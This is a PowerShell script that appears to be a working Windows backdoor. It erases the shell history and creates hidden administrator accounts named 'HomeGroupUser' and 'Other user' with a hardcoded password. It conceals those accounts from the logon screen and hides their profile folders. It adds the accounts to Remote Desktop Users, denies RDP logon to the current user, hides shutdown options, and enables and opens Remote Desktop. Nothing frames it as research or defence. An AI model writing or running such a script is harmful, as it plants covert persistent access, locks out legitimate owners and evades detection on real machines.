Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

$userAccounts = @("HomeGroupUser", "Other user")
$password = "Its@not1t!"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$defaultAccountDescription = "A user account managed by the system."

$adminGroup = 'Administrators'
$rdpGroup   = 'Remote Desktop Users'

$anyUserCreated = $false

function Add-ToGroup ($Group, $Member) {
    if (-not (Get-LocalGroupMember -Name $Group -Member $Member -ErrorAction SilentlyContinue)) {
        Add-LocalGroupMember -Group $Group -Member $Member -ErrorAction Stop
    }
}

foreach ($user in $userAccounts) {
    try {
        if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
            try {
                New-LocalUser -Name $user -Password $securePassword -FullName $user -Description $defaultAccountDescription -PasswordNeverExpires:$true -AccountNeverExpires:$true -UserMayNotChangePassword:$false -ErrorAction Stop
            } catch {
                net user "$user" "$password" /add > `$null 2>&1
                net user "$user" /comment:"$defaultAccountDescription" > `$null 2>&1
                net user "$user" /expires:never > `$null 2>&1
                net user "$user" /active:yes > `$null 2>&1
            }
        }

        $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        Set-ItemProperty -Path $regPath -Name $user -Value 0

        $member = "$env:COMPUTERNAME\$user"
        Add-ToGroup -Group $adminGroup -Member $member
        Add-ToGroup -Group $rdpGroup   -Member $member

        net localgroup "$adminGroup" "$member" /add > `$null 2>&1
        net localgroup "$rdpGroup"   "$member" /add > `$null 2>&1
        net localgroup "$adminGroup" "$member" /add /domain > `$null 2>&1
        net localgroup "$rdpGroup"   "$member" /add /domain > `$null 2>&1

        $userFolder = "${env:SystemDrive}\Users\$user"
        if (-not (Test-Path $userFolder)) {
            try { Copy-Item "$env:SystemDrive\Users\Default" $userFolder -Recurse -ErrorAction Stop }
            catch { New-Item -Path $userFolder -ItemType Directory }
        }
        attrib +h +s $userFolder

        $customFolder = "${env:SystemDrive}\Users\$user.$env:COMPUTERNAME"
        if (-not (Test-Path $customFolder)) { New-Item -Path $customFolder -ItemType Directory }
        attrib +h +s $customFolder

        try {
            Import-Module ActiveDirectory -ErrorAction Stop
            if (-not (Get-ADUser -Filter "SamAccountName -eq '$user'" -ErrorAction SilentlyContinue)) {
                New-ADUser -Name $user -SamAccountName $user -UserPrincipalName "$user@$env:USERDNSDOMAIN" -AccountPassword $securePassword -Enabled $true -Path 'OU=Users,DC=example,DC=com' -Description $defaultAccountDescription -PasswordNeverExpires $true -ErrorAction Stop
                net user "$user" "$password" /add /domain > `$null 2>&1
                net user "$user" /comment:"$defaultAccountDescription" /domain > `$null 2>&1
                net user "$user" /expires:never   /domain > `$null 2>&1
                net user "$user" /active:yes      /domain > `$null 2>&1
            }
        } catch {
            Write-Warning "AD user creation skipped or failed for $user: $($_.Exception.Message)"
        }

        $anyUserCreated = $true
    } catch {
        Write-Warning "Error processing user $user: $($_.Exception.Message)"
    }
}

if (-not $anyUserCreated) { Exit }

$tempDir    = "$env:TEMP\pol_temp"
$configFile = "$tempDir\secpol.inf"
$dbFile     = "$tempDir\secpol.sdb"
$currentUserSID = (New-Object System.Security.Principal.NTAccount("$env:USERDOMAIN\$env:USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).Value

New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
secedit /export /cfg $configFile | Out-Null

$lines = Get-Content $configFile -Encoding ASCII
$idx   = $lines.IndexOf('[Privilege Rights]')
if ($idx -ge 0) {
    $lines = $lines -replace '^SeShutdownPrivilege.*', "SeShutdownPrivilege = S-1-5-32-544"
    if ($lines -match '^SeDenyRemoteInteractiveLogonRight') {
        $lines = $lines -replace ".*SeDenyRemoteInteractiveLogonRight.*", "SeDenyRemoteInteractiveLogonRight = $currentUserSID"
    } else {
        $lines = $lines.Insert($idx+1, "SeDenyRemoteInteractiveLogonRight = $currentUserSID")
    }
    $lines | Set-Content $configFile -Encoding ASCII
    secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet | Out-Null
}
Remove-Item $tempDir -Recurse -Force

Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ShutdownWithoutLogon' -Value 0
$buttons = 'HideShutdown','HideSleep','HideHibernate'
foreach ($b in $buttons) {
    $path = "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\$b"
    Set-ItemProperty -Path $path -Name 'Value' -Value 1 -Type DWord -ErrorAction SilentlyContinue
}

Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'
Set-Service -Name TermService -StartupType Automatic
Start-Service TermService
